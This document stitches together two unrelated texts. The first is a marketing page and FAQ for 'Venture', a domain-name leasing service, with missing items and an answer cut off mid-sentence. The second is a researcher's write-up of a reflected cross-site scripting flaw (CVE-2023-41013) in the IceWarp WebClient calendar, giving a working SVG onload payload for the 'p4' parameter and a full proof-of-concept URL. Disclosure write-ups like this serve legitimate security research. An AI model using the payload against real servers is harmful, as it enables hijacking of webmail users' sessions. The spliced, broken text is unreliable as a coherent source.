## Why A Premium Domain Is Essential For Your Business

### You Want Customers To Find You

Think of your domain name as an investment in a prime piece of online
real estate. Launching your business with a premium name can be like
opening a retail store in a busy shopping district.

### You'll Attract Instant Leads

Due to their short and memorable nature, many premium domains already
receive significant type-in traffic. Your organization can utilize
this established presence and existing traffic to attract customers,
build your brand and gain recognition as an industry leader.

### Your Domain Is Your Brand

You need a name that will resonate with your customers. The intuitive,
memorable nature of premium names makes them ideal. A memorable name
can be easier to brand and helps increase the likelihood of customers
finding you, over your competitor.

Venture is a perpetual rights leasing platform for domain names.
Our mission is to help the next generation of startups create amazing brands.

2. Why are some contracts so highly expensive?

Premium brandable domains, like prime real estate, can be worth up to millions
of dollars, and its value is reflected in its contract.

3. Can I buy the domain instead?

Venture.com is a **digital lease-only platform** because
we want to protect the domain ecology of the web. However, you may contact
the Domain Owner via Whois to inquire if a sale is possible.

4. Can I cancel anytime?

Yes. It’s free to cancel your contract at any time for any reason. You
will not be reimbursed for the payment period you cancel. For more details
please read our [refund policy](/refund_policy).

5. How do I change name servers?

Submit your name servers when you apply or via your account. Once the
Domain Owner has transferred the domain to Venture, it may take 24-72 hours to update.

6. Can I lose the domain?

Venture's model has been designed with your brand's longterm success
in mind. It guarantees you exclusive rights to lease the domain indefinitely.
The Owner cannot cancel for convenience. Therefore, it is contingent upon
your end of the agreement being kept by paying on time and not infringing
on any trademark with the domain.

7. What happens if the domain owners sells the domain?

The new domain owner will be required to agree to your existing lease
agreement terms and conditions. This means you will continue with your

You will be able to transfer/assign your perpetual rights lease to
the new owner of the business built on the domain. We have already executed
a number of these assignments.

9. What is the compensation payment?

The Compensation Payment is a form of assurance to the Owner for the loss of
the domain name. This would only apply to you if you conduct illegal activities
such as blatant trademark infringement. It is calculated based on 250 multiplied
by the Original Monthly Fee, or then-current Monthly Fee, whichever is greater.

10. How can I list my domain names?

Listings are by invitation only.

# Introduction

This article is a write up on how I found Cross Site Scripting (Reflected-XSS) in Webmail Calender in IceWarp WebClient which gave me a new CVE-2023–41013.

**What is Cross Site Scripting (XSS) ?**

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same-origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform and to access any of the user’s data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application’s functionality and data.

# Vulnerability exploitation

Found this vulnerability in Webmail Calender in IceWarp WebClient 10.3.1 allows remote attackers to inject arbitrary web script or HTML via the “p4” field.

1. So first we need to go to
   http://example.com/webmail/calendar/index.html

![]()

2. Enter any random username and click on go and we will be redirected to Webmail Calendar.

Now add any random string and click on search,

We will be redirected to POC URL,

*http://example.com/webmail/calendar/index.html?\_l=folder&p0=main&p1=content&p2=event.main&p3=item.fdr&p4=<<****Vulnerable****>>&p5=E&view=event.list&\_s[search]=batman&\_s[page]=1*

Here we have “p4” parameter which is vulnerable to Cross site scripting,

**Payload:**

*“/><svg/onload=confirm`1`>*

Now final POC URL will be,

*http://example.com/webmail/calendar/index.html?\_l=folder&p0=main&p1=content&p2=event.main&p3=item.fdr&p4=%22/%3E%3Csvg/onload=confirm`1`%3E&p5=E&view=event.list&\_s[search]=batman&\_s[page]=1*

![]()

As observed in the above screenshot, the malicious code is executed.

Thanks for Reading!
